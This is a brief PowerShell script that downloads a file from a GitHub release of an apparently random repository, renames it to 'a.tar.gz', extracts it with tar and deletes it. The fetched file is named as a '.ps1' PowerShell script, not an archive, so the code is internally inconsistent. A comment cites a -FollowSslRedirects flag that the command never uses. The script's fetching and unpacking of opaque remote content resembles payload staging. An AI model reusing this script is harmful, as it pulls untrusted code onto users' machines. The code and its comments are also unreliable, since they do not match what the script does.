# Navigate to the parent directory
cd ..

# Download the tar.gz file
# Use -OutFile with the correct file extension and -FollowSslRedirects for reliability
Invoke-WebRequest -Uri "https://github.com/ARandomAxolotl/t-t/releases/download/nah1/ya.imsitllfck.ps1" -OutFile "a.tar.gz"

# Extract the tar.gz file's contents
# -x: eXtract
# -z: decompress with gzip
# -f: specifies the File
tar -xzf a.tar.gz

# Clean up the downloaded tar.gz file
Remove-Item "a.tar.gz"
